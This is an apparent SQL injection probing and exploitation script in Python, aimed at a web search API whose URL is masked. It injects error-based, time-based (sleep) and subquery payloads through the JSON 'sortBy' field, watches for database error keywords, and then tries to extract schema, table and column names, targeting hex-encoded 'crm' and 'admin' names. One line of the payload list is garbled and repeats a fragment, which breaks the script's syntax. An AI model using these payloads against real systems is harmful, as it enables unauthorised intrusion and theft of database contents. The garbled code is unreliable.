import requests
import json

search_url = "*****"
body1 = '{"keyword":"test","status":"all","sortBy":"create_time","order":"desc","page":1,"size":20}'
try:
    r = requests.post(search_url, data=body1, headers={"Content-Type": "application/json"}, timeout=8)
    ok_len = len(r.text)
    ok_status = r.status_code
except:
    ok_len = -1

tests = [
    ('{"keyword":"test","status":"all","sortBy":"create_time\'","order":"desc","page":1,"size":20}', "sq"),\'","order":"desc","page":1,"size":20}', "sq"),
    ('{"keyword":"test","status":"all","sortBy":"create_time\\"","order":"desc","page":1,"size":20}', "dq"),
    ('{"keyword":"test","status":"all","sortBy":"(select 1 from users where 1=1 and sleep(3))","order":"desc","page":1,"size":20}', "tsleep"),
    ('{"keyword":"test","status":"all","sortBy":"create_time","order":"desc,1","page":1,"size":20}', "comma"),
]

err_words = ["SQL", "mysql", "syntax", "error", "exception", "server error", "sqlstate"]

for b, tag in tests:
    try:
        r = requests.post(search_url, data=b, headers={"Content-Type": "application/json"}, timeout=12)
        for w in err_words:
            if w.lower() in r.text.lower():
                print("sqlerr(" + tag + "): " + w)
                break
        if r.status_code == 500 or r.status_code == 503:
            print("500(" + tag + "): " + b[:60])
    except:
        pass

pocs = [
    ('{"keyword":"test","status":"all","sortBy":"(select group_concat(schema_name) from information_schema.schemata)","order":"desc","page":1,"size":20}', "dbs"),
    ('{"keyword":"test","status":"all","sortBy":"(select group_concat(table_name) from information_schema.tables where table_schema regexp 0x63726d)","order":"desc","page":1,"size":20}', "tbls"),
    ('{"keyword":"test","status":"all","sortBy":"(select group_concat(column_name) from information_schema.columns where table_name regexp 0x61646d696e)","order":"desc","page":1,"size":20}', "cols"),
]

for b, tag in pocs:
    try:
        r = requests.post(search_url, data=b, headers={"Content-Type": "application/json"}, timeout=10)
        if r.status_code == 200 and len(r.text) > 0 and len(r.text) != ok_len:
            print("data(" + tag + "):")
            try:
                j = json.loads(r.text)
                print(str(j)[:600])
            except:
                print(r.text[:600])
    except:
        pass